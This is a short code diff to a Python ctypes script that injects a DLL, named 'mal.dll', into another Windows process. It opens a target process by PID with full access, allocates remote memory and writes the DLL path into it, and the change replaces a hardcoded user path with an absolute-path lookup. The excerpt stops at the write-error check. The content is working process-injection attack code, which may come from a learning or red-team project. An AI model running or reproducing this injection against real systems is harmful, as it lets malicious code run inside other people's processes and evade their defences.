@@ -69,14 +69,13 @@ pid = int(input("PID: "))
 NoteprocHandle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
 print(f"[+] Process Handle acquired: {NoteprocHandle}")
 
-dll_path = b"C:\\Users\\kumar\\Downloads\\ML\\ctpes\\mal.dll\x00"
+import os
 
+dll_full_path = os.path.abspath("mal.dll")
+dll_path = dll_full_path.encode() + b"\x00"
 inj = kernel32.VirtualAllocEx(NoteprocHandle,0, len(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
-
 print(f"[+] Remote Address: {hex(inj)}")
-
 written = c_size_t(0)
-
 s =  kernel32.WriteProcessMemory(NoteprocHandle, inj, dll_path, len(dll_path),byref(written))
 
 if s == False:
